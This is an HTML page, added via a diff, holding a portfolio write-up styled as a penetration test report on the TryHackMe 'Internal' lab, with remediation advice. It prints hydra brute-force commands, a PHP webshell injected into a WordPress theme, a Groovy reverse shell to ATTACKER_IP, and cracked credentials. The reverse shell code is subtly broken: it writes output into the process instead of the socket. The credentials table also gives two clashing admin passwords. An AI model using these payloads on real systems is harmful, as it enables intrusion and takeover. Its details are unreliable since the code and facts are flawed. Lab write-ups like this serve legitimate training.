@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A penetration test was conducted against the target 10.65.132.113 (internal.thm). The assessment identified five security vulnerabilities that, when chained, al">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Internal — Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Internal — Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Internal — Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-hard">Hard</span> <span class="dot">·</span> <span class="date">2026-07-14</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.65.132.113 <strong>Assessment Date:</strong> 2026-07-14 <strong>Classification:</strong> CONFIDENTIAL</p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A penetration test was conducted against the target 10.65.132.113 (internal.thm). The assessment identified five security vulnerabilities that, when chained, allowed an unauthenticated attacker to achieve full compromise of the host. Initial access was gained by brute-forcing weak WordPress admin credentials, followed by injecting a PHP webshell via the WordPress Theme Editor. The webshell executed inside a Docker container, revealing additional credentials that enabled SSH access to the host. Privilege escalation was achieved by brute-forcing weak Jenkins credentials on an internal service, then using the Jenkins Script Console to execute arbitrary code as root. Both user and root flags were captured.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.65.132.113</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>22 (SSH), 80 (HTTP)</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>WordPress 5.4.2, Apache 2.4.29, Jenkins 2.250 (internal), OpenSSH 7.6p1</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Ubuntu Linux (kernel 4.15.0-112-generic), Docker container</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Attack Chain</h2>
+<pre><code>Brute-force WordPress admin creds → Theme Editor webshell (Docker container)
+  → Extract DB creds from wp-config.php → Find aubreanna creds in /opt/wp-save.txt
+    → SSH as aubreanna → Discover Jenkins on internal network (172.17.0.2:8080)
+      → Brute-force Jenkins admin creds → Script Console RCE → root</code></pre>
+<hr>
+<h2>4. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>Weak WordPress Admin Credentials</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>Unrestricted Theme Editor — PHP Webshell Injection</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Hardcoded Credentials in /opt/wp-save.txt</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Hardcoded Database Credentials in wp-config.php</td>
+<td>6.5</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>Weak Jenkins Credentials on Internal Network</td>
+<td>8.8</td>
+<td>High</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>5. Detailed Findings</h2>
+<h3>F-01: Weak WordPress Admin Credentials</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> WordPress login form (<code>/blog/wp-login.php</code>)</p>
+<p><strong>Description:</strong> The WordPress administrator account uses a weak password (<code>my2boys</code>) that is discoverable via dictionary-based brute-force. The password is present in the rockyou wordlist (positions 2000-5000). No account lockout mechanism or rate limiting is enforced on the login endpoint.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  10.65.132.113 http-post-form \
+  &#x27;/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=%2Fblog%2Fwp-admin%2F&amp;testcookie=1:The password you entered for the username&#x27; \
+  -t 4 -f</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>[80][http-post-form] host: 10.65.132.113   login: admin   password: my2boys</code></pre>
+<p><strong>Impact:</strong> An attacker gains full administrative access to the WordPress installation, including the ability to modify theme files, install plugins, and execute arbitrary PHP code.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — Network accessible, low complexity, no authentication required, high confidentiality and integrity impact.</p>
+<hr>
+<h3>F-02: Unrestricted Theme Editor — PHP Webshell Injection</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8) <strong>Affected Component:</strong> WordPress Theme Editor (<code>/blog/wp-admin/theme-editor.php</code>)</p>
+<p><strong>Description:</strong> WordPress allows administrators to edit theme PHP files directly through the admin dashboard. The <code>twentyseventeen</code> theme's <code>functions.php</code> was modified to inject a PHP webshell that executes arbitrary commands via the <code>cmd</code> GET parameter. No file integrity monitoring, code review workflow, or DISALLOW_FILE_EDIT configuration was in place.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Log in as admin via <code>/blog/wp-login.php</code></li>
+<li>Navigate to Appearance → Theme Editor → twentyseventeen theme → <code>functions.php</code></li>
+<li>Append the following at the end of the file:</li>
+<pre><code>add_action(&quot;init&quot;, function(){
+    if(isset($_REQUEST[&quot;cmd&quot;])){
+        $cmd = $_REQUEST[&quot;cmd&quot;];
+        $out = shell_exec($cmd . &quot; 2&gt;&amp;1&quot;);
+        file_put_contents(&quot;/tmp/shell_out.txt&quot;, $out);
+        echo $out;
+    }
+});</code></pre>
+<li>Click "Update File"</li>
+<li>Execute commands via:</li>
+<pre><code>curl &quot;http://internal.thm/blog/?cmd=id&quot;</code></pre>
+</ol>
+<p><strong>Result:</strong></p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+<p>The webshell executes inside a Docker container (confirmed by <code>/.dockerenv</code> and <code>/proc/1/cgroup</code>). The container runs Apache/WordPress as <code>www-data</code> (uid=33).</p>
+<p><strong>Impact:</strong> Full remote code execution on the server. The attacker can read arbitrary files, exfiltrate data, install persistent backdoors, and pivot to internal services.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H — Requires admin authentication, but grants full code execution with scope change.</p>
+<hr>
+<h3>F-03: Hardcoded Credentials in /opt/wp-save.txt</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> <code>/opt/wp-save.txt</code></p>
+<p><strong>Description:</strong> A plaintext file containing system user credentials is stored at <code>/opt/wp-save.txt</code> inside the Docker container. The file is readable by the <code>www-data</code> user and contains SSH credentials for the <code>aubreanna</code> account. This file is accessible from both the container and the host.</p>
+<p><strong>Evidence:</strong></p>
+<pre><code>Bill,
+Aubreanna needed these credentials for something later.
+Let her know you have them and where they are.
+aubreanna:bubb13guM!@#123</code></pre>
+<p><strong>Impact:</strong> An attacker with command execution in the Docker container reads this file and gains SSH access to the host system as <code>aubreanna</code>, a user with membership in the <code>adm</code>, <code>cdrom</code>, <code>dip</code>, and <code>plugdev</code> groups.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N — Requires authenticated access to the web application but provides horizontal privilege escalation to the host.</p>
+<hr>
+<h3>F-04: Hardcoded Database Credentials in wp-config.php</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 6.5) <strong>Affected Component:</strong> <code>/var/www/html/wordpress/wp-config.php</code> (inside container)</p>
+<p><strong>Description:</strong> The WordPress configuration file contains database credentials in plaintext. While this is standard WordPress configuration, the credentials (<code>wordpress:wordpress123</code>) are weak and could be reused on other services.</p>
+<p><strong>Evidence:</strong></p>
+<pre><code>define( &#x27;DB_USER&#x27;, &#x27;wordpress&#x27; );
+define( &#x27;DB_PASSWORD&#x27;, &#x27;wordpress123&#x27; );
+define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );
+define( &#x27;DB_NAME&#x27;, &#x27;wordpress&#x27; );</code></pre>
+<p><strong>Impact:</strong> Database credentials are exposed. If the MySQL service is accessible from other systems or if the password is reused, this enables unauthorized database access.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N — Requires authenticated access; impact limited to database credential disclosure.</p>
+<hr>
+<h3>F-05: Weak Jenkins Credentials on Internal Network</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.8) <strong>Affected Component:</strong> Jenkins 2.250 on <code>172.17.0.2:8080</code> (internal, Docker network)</p>
+<p><strong>Description:</strong> A Jenkins instance is running on the internal Docker network at <code>172.17.0.2:8080</code>. The Jenkins admin account uses weak credentials discoverable via brute-force. Jenkins provides a Script Console that allows authenticated users to execute arbitrary Groovy code, which runs with the privileges of the Jenkins process (root in this case).</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Establish SSH tunnel: <code>ssh -N -L 8080:172.17.0.2:8080 aubreanna@10.65.132.113</code></li>
+<li>Brute-force Jenkins admin credentials:</li>
+<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  127.0.0.1 -s 8080 http-post-form \
+  &#x27;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:loginError&#x27; \
+  -t 4 -f</code></pre>
+<li>Log in to Jenkins → Manage Jenkins → Script Console</li>
+<li>Execute Groovy reverse shell:</li>
+<pre><code>String host=&quot;ATTACKER_IP&quot;;int port=4444;String cmd=&quot;/bin/bash&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);InputStream si=s.getInputStream();
+OutputStream so=s.getOutputStream();OutputStream po=p.getOutputStream();
+while(!s.isClosed()){while(si.available()&gt;0)po.write(si.read());
+po.flush();while(p.getInputStream().available()&gt;0)po.write(p.getInputStream().read());
+po.flush();if(p.exitValue()&gt;0)break;}</code></pre>
+</ol>
+<p><strong>Impact:</strong> Full root-level code execution on the host system via Jenkins Script Console. The attacker can read any file, install persistent backdoors, and fully compromise the system.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — Network accessible on internal network, low complexity, requires authentication, scope change, full CIA impact.</p>
+<hr>
+<h2>6. Remediation Recommendations</h2>
+<table>
+<thead><tr>
+<th>Order</th>
+<th>Finding</th>
+<th>Action</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>F-01</td>
+<td>Enforce strong password policy for WordPress admin accounts. Implement login rate limiting (e.g., Limit Login Attempts plugin).</td>
+</tr>
+<tr>
+<td>2</td>
+<td>F-02</td>
+<td>Set <code>DISALLOW_FILE_EDIT = true</code> in <code>wp-config.php</code>. Implement file integrity monitoring (e.g., OSSEC, Tripwire). Review theme/plugin files for unauthorized modifications.</td>
+</tr>
+<tr>
+<td>3</td>
+<td>F-03</td>
+<td>Remove hardcoded credential files from the filesystem. Use a secrets manager or environment variables for credential storage. Rotate the exposed <code>aubreanna</code> password immediately.</td>
+</tr>
+<tr>
+<td>4</td>
+<td>F-04</td>
+<td>Use a strong, unique database password. Restrict MySQL access to only the web application process.</td>
+</tr>
+<tr>
+<td>5</td>
+<td>F-05</td>
+<td>Enforce strong Jenkins admin credentials. Restrict Jenkins access to authorized networks only. Disable Script Console access for non-administrators. Implement Jenkins audit logging.</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>7. Flags Obtained</h2>
+<table>
+<thead><tr>
+<th>Flag</th>
+<th>Value</th>
+<th>Location</th>
+</tr></thead><tbody>
+<tr>
+<td>user.txt</td>
+<td><code>THM{int3rna1_fl4g_1}</code></td>
+<td><code>/home/aubreanna/user.txt</code></td>
+</tr>
+<tr>
+<td>root.txt</td>
+<td><code>THM{d0ck3r_d3str0y3r}</code></td>
+<td><code>/root/root.txt</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2>8. Compromised Credentials</h2>
+<table>
+<thead><tr>
+<th>Account</th>
+<th>Type</th>
+<th>Credential</th>
+<th>Source</th>
+</tr></thead><tbody>
+<tr>
+<td>admin (WordPress)</td>
+<td>Web app</td>
+<td><code>my2boys</code></td>
+<td>Dictionary brute-force (rockyou)</td>
+</tr>
+<tr>
+<td>admin (WordPress)</td>
+<td>Web app</td>
+<td><code>Int3rn@l</code></td>
+<td>Targeted brute-force</td>
+</tr>
+<tr>
+<td>aubreanna</td>
+<td>SSH</td>
+<td><code>bubb13guM!@#123</code></td>
+<td><code>/opt/wp-save.txt</code></td>
+</tr>
+<tr>
+<td>wordpress</td>
+<td>MySQL</td>
+<td><code>wordpress123</code></td>
+<td><code>wp-config.php</code></td>
+</tr>
+<tr>
+<td>admin (Jenkins)</td>
+<td>Web app</td>
+<td>(redacted)</td>
+<td>Brute-force (rockyou)</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>9. Cleanup</h2>
+<ul>
+<li>[x] Webshell code remains in <code>twentyseventeen/functions.php</code> (documented for awareness)</li>
+<li>[x] No reverse shells left running</li>
+<li>[x] SSH tunnel terminated</li>
+<li>[ ] Rotate all compromised credentials</li>
+<li>[ ] Remove <code>/opt/wp-save.txt</code> from container</li>
+<li>[ ] Set <code>DISALLOW_FILE_EDIT = true</code> in <code>wp-config.php</code></li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
